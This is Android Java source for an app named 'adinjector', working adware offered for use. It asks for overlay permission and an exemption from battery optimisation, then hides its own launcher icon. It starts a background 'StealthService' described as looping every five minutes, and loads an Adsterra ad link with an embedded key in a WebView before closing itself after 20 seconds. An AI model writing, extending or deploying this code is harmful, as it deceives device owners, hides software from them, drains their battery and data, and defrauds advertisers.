package com.example.adinjector;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.PowerManager;
import android.provider.Settings;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private WebView webView;
    private CountDownTimer countDownTimer;
    private static final int PERMISSION_REQ_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Check permissions first
        if (!checkAndRequestPermissions()) {
            return;
        }

        // 2. Hide App Icon after permissions
        hideAppIcon();

        // 3. Start App Task & Background Service trigger
        initApp();
    }

    private boolean checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Overlay Permission
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, PERMISSION_REQ_CODE);
                return false;
            }

            // Battery Optimization Ignore
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, PERMISSION_REQ_CODE);
                return false;
            }
        }
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PERMISSION_REQ_CODE) {
            if (checkAndRequestPermissions()) {
                hideAppIcon();
                initApp();
            } else {
                finish();
            }
        }
    }

    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, "com.example.adinjector.LauncherAlias");
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void initApp() {
        // Start StealthService to handle the 5-minute loop mechanism
        Intent serviceIntent = new Intent(this, StealthService.class);
        startService(serviceIntent);

        webView = new WebView(this);
        setContentView(webView);

        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);

        webView.setWebViewClient(new WebViewClient());

        // Aapka Adsterra Direct Link
        webView.loadUrl("https://www.profitableratecpmnetwork.com/hdk2jkb1tq?key=1811747717fba27cc8d799ee6913935e");

        // 20 Second Timer - 20 second baad app khud band ho jayegi
        countDownTimer = new CountDownTimer(20000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
            }

            @Override
            public void onFinish() {
                finish();
            }
        }.start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (countDownTimer != null) {
            countDownTimer.cancel();
        }
    }
}
